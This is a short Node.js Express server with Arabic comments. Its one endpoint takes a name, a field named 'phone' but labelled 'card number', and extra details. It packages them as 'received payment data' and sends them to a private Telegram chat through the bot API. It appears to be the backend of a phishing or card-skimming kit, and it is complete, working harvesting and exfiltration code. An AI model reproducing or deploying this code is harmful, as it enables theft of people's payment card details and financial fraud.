import express from "express";
import axios from "axios";
import dotenv from "dotenv";
import cors from "cors";
import bodyParser from "body-parser";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// تمكين CORS للسماح بالطلبات من الواجهة الأمامية
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/send", async (req, res) => {
    try {
        const { name, phone, message } = req.body;

        if (!name || !phone || !message) {
            return res.status(400).json({ error: "يجب ملء جميع الحقول!" });
        }

        const text = `🚀 بيانات الدفع المستلمة:\n\n👤 الاسم: ${name}\n📞 رقم البطاقة: ${phone}\n📝 تفاصيل إضافية: ${message}`;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        });

        res.json({ success: true, message: "تم إرسال البيانات بنجاح!" });
    } catch (error) {
        console.error("خطأ في إرسال البيانات:", error);
        res.status(500).json({ error: "حدث خطأ أثناء الإرسال." });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
});
